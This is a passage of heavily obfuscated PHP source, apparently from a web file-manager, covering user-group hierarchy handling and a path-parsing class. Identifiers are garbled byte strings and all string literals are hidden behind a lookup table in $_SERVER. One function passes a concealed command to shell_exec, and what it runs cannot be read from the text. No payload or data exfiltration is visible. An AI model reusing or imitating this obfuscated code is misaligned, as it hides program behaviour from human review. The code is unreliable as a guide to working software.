} } if (!$≈äıÚ⁄Ó) { $≠ˆî‘ñ˛[] = $ÎÖ¿—¶›[$ã¡¢·˜è]; } } return $≠ˆî‘ñ˛; } protected function isParentOf($˙¡¯ÔìÒ, $±›¡Ù†¢) { $ÅßâÖËà =& $_SERVER[ˆë€Ï⁄∂]; if (!$˙¡¯ÔìÒ || !$±›¡Ù†¢ || $˙¡¯ÔìÒ == $±›¡Ù†¢) { return !1; } $ìÏ˚‰£Ò = $this->getInfoSimple($˙¡¯ÔìÒ); $Øôßé¬à = $this->getInfoSimple($±›¡Ù†¢); $¥√†âÛ˜ = $ìÏ˚‰£Ò[$ÅßâÖËà[595]] . $˙¡¯ÔìÒ . $ÅßâÖËà[50]; if (substr($Øôßé¬à[$ÅßâÖËà[595]], 0, strlen($¥√†âÛ˜)) == $¥√†âÛ˜) { return !0; } return !1; } public function groupShowRoot($ÊÎÒË¶º, $˙¯€º÷≤ = false) { $‘Ï’Å∑Ω =& $_SERVER[ˆë€Ï⁄∂]; $ΩöòÁØ® = $this->getInfo($ÊÎÒË¶º); if (!$ΩöòÁØ®) { return array(); } $¥Ñƒ©©ô = $this->parentLevelArray($ΩöòÁØ®[$‘Ï’Å∑Ω[595]]); $ÄÏÇ≥≈œ = array($ÊÎÒË¶º); if (count($¥Ñƒ©©ô) == 0) { return $ÄÏÇ≥≈œ; } if ($˙¯€º÷≤ && count($¥Ñƒ©©ô) == 1) { return $ÄÏÇ≥≈œ; } if (!$ΩöòÁØ®[$‘Ï’Å∑Ω[550]] || !isset($ΩöòÁØ®[$‘Ï’Å∑Ω[550]][$‘Ï’Å∑Ω[2078]]) || $ΩöòÁØ®[$‘Ï’Å∑Ω[550]][$‘Ï’Å∑Ω[2078]] == $‘Ï’Å∑Ω[867]) { return $this->groupShowRoot($¥Ñƒ©©ô[count($¥Ñƒ©©ô) - 1], $˙¯€º÷≤); } if ($ΩöòÁØ®[$‘Ï’Å∑Ω[550]][$‘Ï’Å∑Ω[2078]] == $‘Ï’Å∑Ω[443]) { $ã…˚˚µÕ = explode($‘Ï’Å∑Ω[50], $ΩöòÁØ®[$‘Ï’Å∑Ω[550]][$‘Ï’Å∑Ω[2079]]); if ($ã…˚˚µÕ) { $ÄÏÇ≥≈œ = array_merge($ÄÏÇ≥≈œ, $ã…˚˚µÕ); } } return $ÄÏÇ≥≈œ; } protected function resetParentLevel() { $˛∑Äƒ∂˙ =& $_SERVER[ˆë€Ï⁄∂]; $•Ÿû≤≤‘ = $˛∑Äƒ∂˙[1988]; $Ó˛é˘∆á = $this->select(); $Ó˛é˘∆á = array_to_keyvalue($Ó˛é˘∆á, $•Ÿû≤≤‘); foreach ($Ó˛é˘∆á as $–•éËé√) { $µºãæıá = $–•éËé√; $ùËªÎâö = array(); while ($µºãæıá[$˛∑Äƒ∂˙[202]] != 0) { $ùËªÎâö[] = $µºãæıá[$˛∑Äƒ∂˙[202]]; $µºãæıá = $Ó˛é˘∆á[$µºãæıá[$˛∑Äƒ∂˙[202]]]; } $ùËªÎâö[] = 0; $ùËªÎâö = $˛∑Äƒ∂˙[50] . implode($˛∑Äƒ∂˙[50], array_reverse($ùËªÎâö)) . $˛∑Äƒ∂˙[50]; $this->setNamePinyin($–•éËé√[$•Ÿû≤≤‘], $–•éËé√[$˛∑Äƒ∂˙[32]]); $this->where(array($•Ÿû≤≤‘ => $–•éËé√[$•Ÿû≤≤‘]))->save(array($˛∑Äƒ∂˙[666] => $ùËªÎâö)); } return $Ó˛é˘∆á; } public function groupNameAuto($ì±®ÓßŸ, $≥†‡Ú¸ë) { $¥À™Ó˜µ =& $_SERVER[ˆë€Ï⁄∂]; $©Ö±ûΩ˙ = $this->where(array($¥À™Ó˜µ[488] => $ì±®ÓßŸ))->getField($¥À™Ó˜µ[32], !0); if (!$©Ö±ûΩ˙ || !in_array($≥†‡Ú¸ë, $©Ö±ûΩ˙)) { return $≥†‡Ú¸ë; } for ($æ÷ﬂˆÊ∏ = 1; $æ÷ﬂˆÊ∏ <= count($©Ö±ûΩ˙) + 1; $æ÷ﬂˆÊ∏++) { $√™ãî≤ã = $≥†‡Ú¸ë . "\50{$æ÷ﬂˆÊ∏}\x29"; if (!in_array($√™ãî≤ã, $©Ö±ûΩ˙)) { return $√™ãî≤ã; } } } public function groupSwitch($Å˝∂ΩÍ†, $¥ØÕ‹Úà) { $«Ë⁄Ü∏É =& $_SERVER[ˆë€Ï⁄∂]; $≥˘‘öÏí = array($«Ë⁄Ü∏É[1988] => array($«Ë⁄Ü∏É[7], array($Å˝∂ΩÍ†, $¥ØÕ‹Úà))); $œûÌ”Òﬂ = $this->where($≥˘‘öÏí)->select(); $œûÌ”Òﬂ = array_to_keyvalue($œûÌ”Òﬂ, $«Ë⁄Ü∏É[1988]); if (!isset($œûÌ”Òﬂ[$Å˝∂ΩÍ†]) || !isset($œûÌ”Òﬂ[$¥ØÕ‹Úà]) || $œûÌ”Òﬂ[$Å˝∂ΩÍ†][$«Ë⁄Ü∏É[202]] == 0) { return !1; } $≥˘‘öÏí = array($«Ë⁄Ü∏É[1988] => $Å˝∂ΩÍ†); $ﬂ≤œ¿ú≈ = Model($«Ë⁄Ü∏É[2082])->where($≥˘‘öÏí)->select(); if (!$ﬂ≤œ¿ú≈) { $ﬂ≤œ¿ú≈ = array(); } foreach ($ﬂ≤œ¿ú≈ as $ÅêﬂîàÉ) { $ª¨»Ï—Ó = $ÅêﬂîàÉ[$«Ë⁄Ü∏É[1787]]; $≥˘‘öÏí = array($«Ë⁄Ü∏É[1787] => $ª¨»Ï—Ó, $«Ë⁄Ü∏É[1988] => $¥ØÕ‹Úà); $ı√Å≠º˛ = Model($«Ë⁄Ü∏É[2082])->where($≥˘‘öÏí)->find(); if (!$ı√Å≠º˛) { $˝¥Í≤èÈ = array($¥ØÕ‹Úà => $ÅêﬂîàÉ[$«Ë⁄Ü∏É[2096]]); Model($«Ë⁄Ü∏É[608])->userGroupAdd($ª¨»Ï—Ó, $˝¥Í≤èÈ); } Model($«Ë⁄Ü∏É[608])->userGroupRemove($ª¨»Ï—Ó, $Å˝∂ΩÍ†); } $≥˘‘öÏí = array($«Ë⁄Ü∏É[200] => 2, $«Ë⁄Ü∏É[202] => 0, $«Ë⁄Ü∏É[496] => 1, $«Ë⁄Ü∏É[580] => array($«Ë⁄Ü∏É[7], array($Å˝∂ΩÍ†, $¥ØÕ‹Úà))); $Û¨È†ˆé = Model($«Ë⁄Ü∏É[916])->where($≥˘‘öÏí)->field($«Ë⁄Ü∏É[2097])->select(); $Û¨È†ˆé = array_to_keyvalue($Û¨È†ˆé, $«Ë⁄Ü∏É[580], $«Ë⁄Ü∏É[203]); $úΩ∫Ûôå = !empty($Û¨È†ˆé[$Å˝∂ΩÍ†]) ? $Û¨È†ˆé[$Å˝∂ΩÍ†] : !1; if ($úΩ∫Ûôå) { if (!$Û¨È†ˆé[$¥ØÕ‹Úà]) { $Û¨È†ˆé[$¥ØÕ‹Úà] = Model($«Ë⁄Ü∏É[916])->groupRootAdd($¥ØÕ‹Úà); } $üÑ áµ… = $Û¨È†ˆé[$¥ØÕ‹Úà]; $≥˘‘öÏí = array($«Ë⁄Ü∏É[202] => $úΩ∫Ûôå); $Û¨È†ˆé = Model($«Ë⁄Ü∏É[916])->where($≥˘‘öÏí)->field($«Ë⁄Ü∏É[2098])->select(); if (!$Û¨È†ˆé) { $Û¨È†ˆé = array(); } Model($«Ë⁄Ü∏É[916])->moveClearAuth = !1; foreach ($Û¨È†ˆé as $ù¿ß‹Ùê) { $ı›’°€Â = $ù¿ß‹Ùê[$«Ë⁄Ü∏É[496]] == $«Ë⁄Ü∏É[101] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($«Ë⁄Ü∏É[916])->move($ù¿ß‹Ùê[$«Ë⁄Ü∏É[203]], $üÑ áµ…, $ı›’°€Â); } Model($«Ë⁄Ü∏É[916])->moveClearAuth = !0; $≥˘‘öÏí = array($«Ë⁄Ü∏É[200] => 2, $«Ë⁄Ü∏É[580] => $Å˝∂ΩÍ†); $¸˝»òÔ® = array($«Ë⁄Ü∏É[580] => $¥ØÕ‹Úà); Model($«Ë⁄Ü∏É[2099])->where($≥˘‘öÏí)->save($¸˝»òÔ®); Model($«Ë⁄Ü∏É[2100])->where($≥˘‘öÏí)->save($¸˝»òÔ®); } $this->_changeChildLevel($œûÌ”Òﬂ[$Å˝∂ΩÍ†], $œûÌ”Òﬂ[$¥ØÕ‹Úà], !0); $this->where(array($«Ë⁄Ü∏É[202] => $Å˝∂ΩÍ†))->save(array($«Ë⁄Ü∏É[202] => $¥ØÕ‹Úà)); $this->_clearChildrenCache($œûÌ”Òﬂ[$¥ØÕ‹Úà]); return !0; } } goto EÊèíË∆ô≈; bªé∑ôŒˆ‹: class KodIO { const KOD_SOURCE = "\x7b\x73\x6f\165\162\x63\x65\175"; const KOD_USER_RECYCLE = "\173\x75\163\x65\x72\x52\145\143\171\x63\x6c\145\x7d"; const KOD_USER_FAV = "\173\165\x73\145\162\x46\x61\166\175"; const KOD_USER_FILE_TAG = "\173\x75\x73\145\162\x46\151\x6c\x65\x54\x61\147\x7d"; const KOD_USER_FILE_TYPE = "\x7b\165\163\145\162\x46\151\x6c\x65\124\x79\160\145\175"; const KOD_GROUP_ROOT_SELF = "\173\147\162\157\x75\160\x52\157\x6f\x74\123\x65\x6c\x66\x7d"; const KOD_USER_SHARE = "\x7b\x75\163\x65\x72\123\x68\x61\x72\x65\175"; const KOD_USER_SHARE_LINK = "\173\165\x73\145\162\123\150\x61\x72\x65\x4c\x69\x6e\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\173\x73\150\141\x72\145\x54\157\115\x65\x7d"; const KOD_SHARE_ITEM = "\173\x73\150\x61\162\x65\111\164\145\x6d\x7d"; const KOD_SHARE_LINK = "\x7b\163\x68\x61\162\145\111\164\x65\155\114\x69\156\153\175"; const KOD_SEARCH = "\173\163\145\x61\162\143\150\175"; const KOD_BLOCK = "\173\142\154\157\x63\x6b\x7d"; const KOD_IO = "\173\x69\x6f\x7d"; const KOD_USER_RECENT = "\x7b\x75\x73\145\x72\x52\145\x6e\x63\x65\156\x74\175"; const KOD_USER_DRIVER = "\173\144\162\151\166\145\162\x7d"; public static function typeList() { $ı‚≤ºå≈ =& $_SERVER[ˆë€Ï⁄∂]; return array($ı‚≤ºå≈[1351] => self::KOD_SOURCE, $ı‚≤ºå≈[1352] => self::KOD_USER_RECYCLE, $ı‚≤ºå≈[1353] => self::KOD_USER_FAV, $ı‚≤ºå≈[1354] => self::KOD_USER_FILE_TAG, $ı‚≤ºå≈[1355] => self::KOD_USER_FILE_TYPE, $ı‚≤ºå≈[1356] => self::KOD_GROUP_ROOT_SELF, $ı‚≤ºå≈[1357] => self::KOD_USER_SHARE, $ı‚≤ºå≈[1358] => self::KOD_USER_SHARE_LINK, $ı‚≤ºå≈[1359] => self::KOD_USER_SHARE_TO_ME, $ı‚≤ºå≈[1360] => self::KOD_SHARE_ITEM, $ı‚≤ºå≈[1361] => self::KOD_SHARE_LINK, $ı‚≤ºå≈[1362] => self::KOD_SEARCH, $ı‚≤ºå≈[1363] => self::KOD_BLOCK, $ı‚≤ºå≈[1364] => self::KOD_IO, $ı‚≤ºå≈[1365] => self::KOD_USER_RECENT, $ı‚≤ºå≈[1366] => self::KOD_USER_DRIVER); } public static function parse($ÜØªÌ Æ) { $Ãã˝ÀÚ¯ =& $_SERVER[ˆë€Ï⁄∂]; $ÜØªÌ Æ = self::clear($ÜØªÌ Æ); $æ‰ıÅ‘Ê = array_values(self::typeList()); preg_match($Ãã˝ÀÚ¯[1367], $ÜØªÌ Æ, $¸⁄ôå¯ø); $Õºº‹≤€ = array($Ãã˝ÀÚ¯[507] => !1, $Ãã˝ÀÚ¯[1368] => !1, $Ãã˝ÀÚ¯[504] => !1, $Ãã˝ÀÚ¯[97] => $ÜØªÌ Æ, $Ãã˝ÀÚ¯[1266] => !1, $Ãã˝ÀÚ¯[1265] => $Ãã˝ÀÚ¯[12]); if (is_array($¸⁄ôå¯ø) && count($¸⁄ôå¯ø) == 5) { $Û˜®⁄ëû = $Ãã˝ÀÚ¯[1369] . $¸⁄ôå¯ø[2] . $Ãã˝ÀÚ¯[413]; if (in_array($Û˜®⁄ëû, $æ‰ıÅ‘Ê)) { $Õºº‹≤€[$Ãã˝ÀÚ¯[1266]] = $¸⁄ôå¯ø[1]; $Õºº‹≤€[$Ãã˝ÀÚ¯[33]] = $Û˜®⁄ëû; $Õºº‹≤€[$Ãã˝ÀÚ¯[1370]] = substr($Û˜®⁄ëû, 1, -1); $Õºº‹≤€[$Ãã˝ÀÚ¯[486]] = $¸⁄ôå¯ø[3]; } $Õºº‹≤€[$Ãã˝ÀÚ¯[1265]] = $¸⁄ôå¯ø[4]; } $èò±ûÏá = array($Ãã˝ÀÚ¯[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $Õºº‹≤€[$Ãã˝ÀÚ¯[1333]] = in_array($Õºº‹≤€[$Ãã˝ÀÚ¯[33]], $èò±ûÏá); return $Õºº‹≤€; } public static function isTruePath($èò„ÏÄ–) { $ÚêíÎ…π =& $_SERVER[ˆë€Ï⁄∂]; if (substr($èò„ÏÄ–, 0, 1) != $ÚêíÎ…π[1369]) { return !0; } if (strpos($èò„ÏÄ–, $ÚêíÎ…π[494]) === 0) { return !0; } if (strpos($èò„ÏÄ–, $ÚêíÎ…π[1337]) === 0) { return !0; } if (strpos($èò„ÏÄ–, $ÚêíÎ…π[1371]) === 0) { return !0; } if (strpos($èò„ÏÄ–, $ÚêíÎ…π[1372]) === 0) { return !0; } if (strpos($èò„ÏÄ–, $ÚêíÎ…π[1373]) === 0) { return !0; } return !1; } public static function clear($Õ÷„‹ÕË) { $≈É∏Éﬁ⁄ =& $_SERVER[ˆë€Ï⁄∂]; $Õ÷„‹ÕË = str_replace(array($≈É∏Éﬁ⁄[1171], $≈É∏Éﬁ⁄[59]), $≈É∏Éﬁ⁄[53], $Õ÷„‹ÕË); $Õ÷„‹ÕË = str_replace($≈É∏Éﬁ⁄[110], $≈É∏Éﬁ⁄[8], $Õ÷„‹ÕË); $–◊ıﬁÍé = $≈É∏Éﬁ⁄[1374]; if (substr($Õ÷„‹ÕË, 0, 3) == $≈É∏Éﬁ⁄[1375]) { $Õ÷„‹ÕË = substr($Õ÷„‹ÕË, 3); } while (strstr($Õ÷„‹ÕË, $–◊ıﬁÍé)) { $Õ÷„‹ÕË = str_replace($–◊ıﬁÍé, $≈É∏Éﬁ⁄[8], $Õ÷„‹ÕË); } $Õ÷„‹ÕË = preg_replace($≈É∏Éﬁ⁄[1376], $≈É∏Éﬁ⁄[8], $Õ÷„‹ÕË); if ($Õ÷„‹ÕË == $≈É∏Éﬁ⁄[8]) { return $≈É∏Éﬁ⁄[8]; } $Õ÷„‹ÕË = rtrim($Õ÷„‹ÕË, $≈É∏Éﬁ⁄[8]); return $Õ÷„‹ÕË; } public static function pathTrue($∫Ÿˆ¶µŒ) { $≠ùå¶™ì =& $_SERVER[ˆë€Ï⁄∂]; if (!$∫Ÿˆ¶µŒ) { return $≠ùå¶™ì[12]; } $∫Ÿˆ¶µŒ = str_replace($≠ùå¶™ì[266], $≠ùå¶™ì[8], str_replace($≠ùå¶™ì[1377], $≠ùå¶™ì[8], $∫Ÿˆ¶µŒ)); $∫Ÿˆ¶µŒ = str_replace($≠ùå¶™ì[266], $≠ùå¶™ì[8], str_replace($≠ùå¶™ì[1377], $≠ùå¶™ì[8], $∫Ÿˆ¶µŒ)); if (!strstr($∫Ÿˆ¶µŒ, $≠ùå¶™ì[1375])) { return $∫Ÿˆ¶µŒ; } $¥≥È™‡õ = explode($≠ùå¶™ì[8], $∫Ÿˆ¶µŒ); foreach ($¥≥È™‡õ as $”“Í≤ò≤ => $€¯√˛˘˚) { if ($€¯√˛˘˚ !== $≠ùå¶™ì[1378]) { continue; } for ($”Öìâ˜Á = $”“Í≤ò≤; $”Öìâ˜Á >= 0; $”Öìâ˜Á--) { if ($¥≥È™‡õ[$”Öìâ˜Á] === $≠ùå¶™ì[10] || $¥≥È™‡õ[$”Öìâ˜Á] === $≠ùå¶™ì[1378] || $¥≥È™‡õ[$”Öìâ˜Á] === -1) { continue; } if ($¥≥È™‡õ[$”Öìâ˜Á] === $≠ùå¶™ì[12]) { $¥≥È™‡õ[$”“Í≤ò≤] = -1; break; } $¥≥È™‡õ[$”“Í≤ò≤] = -1; $¥≥È™‡õ[$”Öìâ˜Á] = -1; break; } } $˚ò“¥·è = array(); foreach ($¥≥È™‡õ as $€¯√˛˘˚) { if ($€¯√˛˘˚ !== -1) { $˚ò“¥·è[] = $€¯√˛˘˚; } } $áàΩ÷ŸŸ = implode($≠ùå¶™ì[8], $˚ò“¥·è); if (strpos($áàΩ÷ŸŸ, $≠ùå¶™ì[1379]) === 0) { $áàΩ÷ŸŸ = $≠ùå¶™ì[1375] . substr($áàΩ÷ŸŸ, strlen($≠ùå¶™ì[1379])); } return $áàΩ÷ŸŸ; } public static function pathUrlClear($ﬁßÓ˘¥) { $˛¢∫ù‚› =& $_SERVER[ˆë€Ï⁄∂]; if (!$ﬁßÓ˘¥) { return $ﬁßÓ˘¥; } $ﬁßÓ˘¥ = rawurldecode($ﬁßÓ˘¥); $ﬁßÓ˘¥ = str_replace($˛¢∫ù‚›[1377], $˛¢∫ù‚›[8], $ﬁßÓ˘¥); if (strpos($ﬁßÓ˘¥, $˛¢∫ù‚›[86]) > 0) { $ﬁßÓ˘¥ = substr($ﬁßÓ˘¥, 0, strpos($ﬁßÓ˘¥, $˛¢∫ù‚›[86])); } if (strpos($ﬁßÓ˘¥, $˛¢∫ù‚›[1380]) > 0) { $ﬁßÓ˘¥ = substr($ﬁßÓ˘¥, 0, strpos($ﬁßÓ˘¥, $˛¢∫ù‚›[1380])); } return $ﬁßÓ˘¥; } public static function sourceID($ﬁâÅÀî◊) { $â„Â¿⁄ =& $_SERVER[ˆë€Ï⁄∂]; $⁄˛ûÑö© = self::parse($ﬁâÅÀî◊); if ($⁄˛ûÑö©[$â„Â¿⁄[33]] !== self::KOD_SOURCE) { show_json(LNG($â„Â¿⁄[1381]), !1); } return $⁄˛ûÑö©[$â„Â¿⁄[486]]; } public static function make($•Œ¨§◊Œ) { if (!$•Œ¨§◊Œ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($•Œ¨§◊Œ)); } public static function makeShare($Êøƒ∞ ù, $ÈòÇ˙’û) { return self::makePath(self::KOD_SHARE_ITEM, $Êøƒ∞ ù, $ÈòÇ˙’û); } public static function makeFileTypePath($∂—§—Æ‰) { return self::makePath(self::KOD_USER_FILE_TYPE, $∂—§—Æ‰); } public static function makeFileTagPath($°˛øöç«) { return self::makePath(self::KOD_USER_FILE_TAG, $°˛øöç«); } public static function makePath($‰®∂™Ì¡, $´äÎØ¡À = '', $§Û¿‚òï = '') { $ûÌÈ©»» =& $_SERVER[ˆë€Ï⁄∂]; $øö‰åãé = substr($‰®∂™Ì¡, 1, -1); $ﬂÖÈ≥±¬ = $ûÌÈ©»»[1382] . $øö‰åãé . $ûÌÈ©»»[1383] . $´äÎØ¡À . $ûÌÈ©»»[1384]; $ﬂÖÈ≥±¬ = $§Û¿‚òï ? $ﬂÖÈ≥±¬ . $§Û¿‚òï . $ûÌÈ©»»[8] : $ﬂÖÈ≥±¬; return $ﬂÖÈ≥±¬; } public static function hashPath($®œÙµî≤, $‚°Íù’∆ = true) { $ÃÈÚ≤å… =& $_SERVER[ˆë€Ï⁄∂]; $≤öß∑à¥ = is_array($®œÙµî≤) ? $®œÙµî≤ : IO::info($®œÙµî≤); $–∆ı„≈¥ = _get($≤öß∑à¥, $ÃÈÚ≤å…[1385], $ÃÈÚ≤å…[12]); if (!$–∆ı„≈¥ && isset($≤öß∑à¥[$ÃÈÚ≤å…[247]])) { $–∆ı„≈¥ = trim($≤öß∑à¥[$ÃÈÚ≤å…[247]], $ÃÈÚ≤å…[131]); } if (!$–∆ı„≈¥ && isset($≤öß∑à¥[$ÃÈÚ≤å…[203]]) && $≤öß∑à¥[$ÃÈÚ≤å…[203]]) { $≤öß∑à¥ = IO::info(KodIO::make($≤öß∑à¥[$ÃÈÚ≤å…[203]])); $–∆ı„≈¥ = _get($≤öß∑à¥, $ÃÈÚ≤å…[1385], $ÃÈÚ≤å…[12]); } $Ä¬€∆°Ÿ = md5($≤öß∑à¥[$ÃÈÚ≤å…[97]] . $≤öß∑à¥[$ÃÈÚ≤å…[89]] . $≤öß∑à¥[$ÃÈÚ≤å…[98]]); if (!$–∆ı„≈¥ && file_exists($≤öß∑à¥[$ÃÈÚ≤å…[97]])) { $–∆ı„≈¥ = Cache::get($Ä¬€∆°Ÿ . $ÃÈÚ≤å…[1386]); $–∆ı„≈¥ = !1; if (!$–∆ı„≈¥) { $–∆ı„≈¥ = IO::hashSimple($≤öß∑à¥[$ÃÈÚ≤å…[97]]); Cache::set($Ä¬€∆°Ÿ . $ÃÈÚ≤å…[1386], $–∆ı„≈¥, 3600 * 24 * 30); } } if ($‚°Íù’∆ && !$–∆ı„≈¥) { } return $–∆ı„≈¥ ? $–∆ı„≈¥ : $Ä¬€∆°Ÿ; } public static function hashPathSafe($Âõê˘˛à, $∆¯≥˘œñ = true) { $öÚ⁄â∏„ =& $_SERVER[ˆë€Ï⁄∂]; $‚›˙‡”¸ = self::hashPath($Âõê˘˛à, $∆¯≥˘œñ); return md5($‚›˙‡”¸ . $öÚ⁄â∏„[1387] . Model($öÚ⁄â∏„[861])->get($öÚ⁄â∏„[862])); } public static function initSystemPath() { $â˙ÒÌìÖ =& $_SERVER[ˆë€Ï⁄∂]; if (defined($â˙ÒÌìÖ[1388])) { return; } define($â˙ÒÌìÖ[1388], self::systemPath($â˙ÒÌìÖ[201])); define($â˙ÒÌìÖ[1389], self::systemPath($â˙ÒÌìÖ[1390])); define($â˙ÒÌìÖ[1391], self::systemPath($â˙ÒÌìÖ[1392])); define($â˙ÒÌìÖ[1393], self::systemPath($â˙ÒÌìÖ[1394])); IOHistory::bindEvent(); } public static function systemPath($„ﬁ‰¿µ©) { $œÅ©∆ò  =& $_SERVER[ˆë€Ï⁄∂]; $Ê–¨«óÑ = $œÅ©∆ò [1395] . ucfirst($„ﬁ‰¿µ©); $≈„¶Õ§Ò = Model($œÅ©∆ò [861])->get($Ê–¨«óÑ); if ($≈„¶Õ§Ò) { return $≈„¶Õ§Ò; } if ($„ﬁ‰¿µ© == $œÅ©∆ò [201]) { $≈„¶Õ§Ò = self::make(Model($œÅ©∆ò [916])->systemRootPathAdd($œÅ©∆ò [619])); } else { $≈„¶Õ§Ò = self::systemPath($œÅ©∆ò [201]); $˘æ≤é´Ï = self::sourceID($≈„¶Õ§Ò); $≈„¶Õ§Ò = self::make(Model($œÅ©∆ò [916])->mkdir($˘æ≤é´Ï, $„ﬁ‰¿µ©)); } Model($œÅ©∆ò [861])->set($Ê–¨«óÑ, $≈„¶Õ§Ò); return $≈„¶Õ§Ò; } public static function systemFolder($…õπ¨ú©) { $ÿæÏÔ¯• = IO_PATH_SYSTEM_SOURCE . $…õπ¨ú©; $—Å–Íªﬂ = Cache::get($ÿæÏÔ¯•); if (!$—Å–Íªﬂ) { $’ºö§È— = IO::infoFullSimple($ÿæÏÔ¯•); if (!$’ºö§È—) { $—Å–Íªﬂ = IO::mkdir($ÿæÏÔ¯•, REPEAT_SKIP); } else { $—Å–Íªﬂ = $’ºö§È—[$_SERVER[ˆë€Ï⁄∂][97]]; } Cache::set($ÿæÏÔ¯•, $—Å–Íªﬂ, 3600 * 10); } return $—Å–Íªﬂ; } public static function defaultDriver() { return Model($_SERVER[ˆë€Ï⁄∂][858])->defaultDriver(); } public static function defaultIO() { $ÄÃúÈ©á =& $_SERVER[ˆë€Ï⁄∂]; $§ô’≤íß = self::defaultDriver(); return $ÄÃúÈ©á[1396] . $§ô’≤íß[$ÄÃúÈ©á[486]] . $ÄÃúÈ©á[1384]; } public static function defaultDriverInit() { static $∏¨„Ó°û = false; if ($∏¨„Ó°û) { return $∏¨„Ó°û; } $∏¨„Ó°û = IO::init(self::defaultIO()); return $∏¨„Ó°û; } public static function fileTypeList() { $¸≈ ™¿° =& $_SERVER[ˆë€Ï⁄∂]; $ÔÉâ©í— = $GLOBALS[$¸≈ ™¿°[6]][$¸≈ ™¿°[1397]]; foreach ($ÔÉâ©í— as $û≈⁄ÙÈÇ => $ ìïíêú) { $”‰€∞∂˚ = $¸≈ ™¿°[1398] . $û≈⁄ÙÈÇ; $ß°ÀÅ∆  = LNG($”‰€∞∂˚); if ($”‰€∞∂˚ != $ß°ÀÅ∆ ) { $ÔÉâ©í—[$û≈⁄ÙÈÇ][$¸≈ ™¿°[32]] = $ß°ÀÅ∆ ; } } return $ÔÉâ©í—; } public static function diskList($Ò–Œæ€‡ = true) { $√Ãì‡∏ = $_SERVER[ˆë€Ï⁄∂][1399]; if ($Ò–Œæ€‡) { $£ÉëÖò• = Cache::get($√Ãì‡∏); if (is_array($£ÉëÖò•)) { return $£ÉëÖò•; } } $£ÉëÖò• = self::diskListGet(); Cache::set($√Ãì‡∏, $£ÉëÖò•, 60); return $£ÉëÖò•; } public static function diskListGet() { $Ê≤ÂÂ»† =& $_SERVER[ˆë€Ï⁄∂]; $˘¨πàÿö = array(); if ($GLOBALS[$Ê≤ÂÂ»†[6]][$Ê≤ÂÂ»†[1400]] == $Ê≤ÂÂ»†[1401]) { $ç˜ÈòòÃ = $Ê≤ÂÂ»†[1402]; for ($ª¨˜éâ≠ = 0; $ª¨˜éâ≠ < strlen($ç˜ÈòòÃ); $ª¨˜éâ≠++) { $¥ÃÛøﬂ„ = $ç˜ÈòòÃ[$ª¨˜éâ≠] . $Ê≤ÂÂ»†[1403]; if (file_exists($¥ÃÛøﬂ„)) { $˘¨πàÿö[] = $¥ÃÛøﬂ„; } } return $˘¨πàÿö; } if (!function_exists($Ê≤ÂÂ»†[111])) { $˘¨πàÿö[] = $Ê≤ÂÂ»†[927]; return $˘¨πàÿö; } $‚§Ô∑œÁ = explode($Ê≤ÂÂ»†[59], shell_exec($Ê≤ÂÂ»†[1404])); array_shift($‚§Ô∑œÁ); array_pop($‚§Ô∑œÁ); $€…é≤°¡ = array($Ê≤ÂÂ»†[1405], $Ê≤ÂÂ»†[1406], $Ê≤ÂÂ»†[1407], $Ê≤ÂÂ»†[1408], $Ê≤ÂÂ»†[1409], $Ê≤ÂÂ»†[1410], $Ê≤ÂÂ»†[1411], $Ê≤ÂÂ»†[1412]); foreach ($‚§Ô∑œÁ as $ìãÕ¥ìÍ) { $¡¥ﬂÊ≥˙ = preg_split($Ê≤ÂÂ»†[1413], $ìãÕ¥ìÍ); $¥ÃÛøﬂ„ = $¡¥ﬂÊ≥˙[count($¡¥ﬂÊ≥˙) - 1]; if (!strstr($¡¥ﬂÊ≥˙[0], $Ê≤ÂÂ»†[1414]) || !$¥ÃÛøﬂ„) { continue; } $†™∆äÆÈ = rtrim($¥ÃÛøﬂ„, $Ê≤ÂÂ»†[8]) . $Ê≤ÂÂ»†[8]; if (in_array($†™∆äÆÈ, $€…é≤°¡)) { continue; } $˘¨πàÿö[] = $†™∆äÆÈ; } return $˘¨πàÿö; } public static function isSameDisk($œú™ä˙ì, $˛ûÒò„‚) { $ç»ï´£ =& $_SERVER[ˆë€Ï⁄∂]; if ($GLOBALS[$ç»ï´£[6]][$ç»ï´£[1400]] == $ç»ï´£[1401]) { return strtolower(substr($œú™ä˙ì, 0, 1)) == strtolower(substr($˛ûÒò„‚, 0, 1)); } $ÀÇƒÂ«ö = stat($œú™ä˙ì); $»÷ÉÏÃ˜ = stat($˛ûÒò„‚); if ($ÀÇƒÂ«ö === !1 || $»÷ÉÏÃ˜ === !1) { return !1; } return $ÀÇƒÂ«ö[$ç»ï´£[1415]] === $»÷ÉÏÃ˜[$ç»ï´£[1415]]; $ÿñª›´ä = self::diskList(); $´œÖ∞“˝ = !1; $ªÙçâÒ˛ = !1; sort($ÿñª›´ä); $ÿñª›´ä = array_reverse($ÿñª›´ä); $œú™ä˙ì = rtrim($œú™ä˙ì, $ç»ï´£[8]) . $ç»ï´£[8]; $˛ûÒò„‚ = rtrim($˛ûÒò„‚, $ç»ï´£[8]) . $ç»ï´£[8]; foreach ($ÿñª›´ä as $˝≥ÿæÚÓ) { $Õ◊ë˛À¬ = strlen($˝≥ÿæÚÓ); if (!$´œÖ∞“˝ && substr($œú™ä˙ì, 0, $Õ◊ë˛À¬) == $˝≥ÿæÚÓ) { $´œÖ∞“˝ = $˝≥ÿæÚÓ; } if (!$ªÙçâÒ˛ && substr($˛ûÒò„‚, 0, $Õ◊ë˛À¬) == $˝≥ÿæÚÓ) { $ªÙçâÒ˛ = $˝≥ÿæÚÓ; } if ($´œÖ∞“˝ && $ªÙçâÒ˛) { break; } } return $´œÖ∞“˝ === $ªÙçâÒ˛; } public static function transferType($˙¶â¨æÂ, $‚éΩ‚»„) { $‰®Ê‹ôÅ =& $_SERVER[ˆë€Ï⁄∂]; $ì“ŸëÛ‰ = self::driverType($˙¶â¨æÂ); $ßØæÊØ = self::driverType($‚éΩ‚»„); if ($ì“ŸëÛ‰[$‰®Ê‹ôÅ[33]] == $ßØæÊØ[$‰®Ê‹ôÅ[33]] && $ì“ŸëÛ‰[$‰®Ê‹ôÅ[1416]] == $ßØæÊØ[$‰®Ê‹ôÅ[1416]]) { return $‰®Ê‹ôÅ[1417]; } if ($ì“ŸëÛ‰[$‰®Ê‹ôÅ[33]] == $‰®Ê‹ôÅ[961] && $ßØæÊØ[$‰®Ê‹ôÅ[33]] == 